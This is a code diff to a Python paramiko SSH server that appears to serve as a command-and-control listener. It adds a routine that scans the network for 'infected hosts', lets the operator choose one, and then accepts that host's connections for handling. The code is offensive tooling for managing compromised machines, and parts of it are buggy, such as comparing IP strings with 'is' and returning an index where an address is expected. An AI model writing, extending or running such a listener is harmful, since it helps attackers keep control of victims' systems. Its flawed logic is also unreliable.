@@ -3,6 +3,7 @@ import paramiko
 import threading
 import sys
 import os
+import virus_scanner
 
 #script args
 server_address = '127.0.0.1'
@@ -20,7 +21,7 @@ class Server(paramiko.ServerInterface):
     def __init__(self):
         self.username = ""
         self.event = threading.Event()
-
+    
 
     def check_auth_password(self, username, password):
         if username == server_username and password == server_password:
@@ -96,17 +97,82 @@ def client_handler(client_socket):
                         sys.exit(1)
     except:
         pass
-#ssh server bind and listen
-try:
-    server_socket.bind((server_address, server_port))
-except:
-    print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
-    sys.exit(1)
-print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
-server_socket.listen(100)
-print("[*] Listening")
-#Keep ssh server active and accept incoming tcp connections
-while True:
-    client_socket, addr = server_socket.accept()
-    print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
-    client_handler(client_socket)
+
+
+
+
+#scan network and display infected hosts to pick up the one u want
+def scan_and_choose():
+    vs = virus_scanner.virus_scanner(port=7688)  
+    hosts = vs.get_ihosts()
+
+    selected = False
+
+    if len(hosts)-1 == 0:
+        print("[!] Network scan failed, enabling manual mode...")
+        while not selected:
+            try:
+                i = input("Select host IP : ")
+                try:
+                    print(f"[+] Processing connection to {i} ({socket.gethostbyaddr(i)[0]})")
+                except:
+                    print(f"[+] Processing connection to {i}")
+                selected = True
+                return i
+            except:
+                pass
+
+    for i in range(len(hosts)-1):
+        try:
+            print(f"[{i}] {hosts[i]} ({socket.gethostbyaddr(hosts[i])[0]})")
+        except:
+            print(f"[{i}] {hosts[i]}")
+
+
+
+    
+    while not selected:
+        try:
+            i = int(input("Select host index : "))
+            if i <= len(hosts):
+                try:
+                    print(f"[+] Processing connection to {hosts[i]} ({socket.gethostbyaddr(hosts[i])[0]})")
+                except:
+                    print(f"[+] Processing connection to {hosts[i]}")
+                selected = True
+                return i
+            else:
+                print("[!] Index out of range")
+        except:
+            pass
+
+
+def start_server_and_listen_to_host(host):
+
+    #ssh server bind and listen
+    try:
+        server_socket.bind((server_address, server_port))
+    except:
+        print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
+        sys.exit(1)
+        
+    print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
+    server_socket.listen(100)
+    print("[*] Listening")
+    #Keep ssh server active and accept incoming tcp connections
+    while True:
+        client_socket, addr = server_socket.accept()
+        if addr[0] is host:
+            print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
+            client_handler(client_socket)
+
+
+
+
+
+#scan network and display infected hosts to pick up the one u want
+
+host = scan_and_choose()
+
+#start server
+start_server_and_listen_to_host(host)
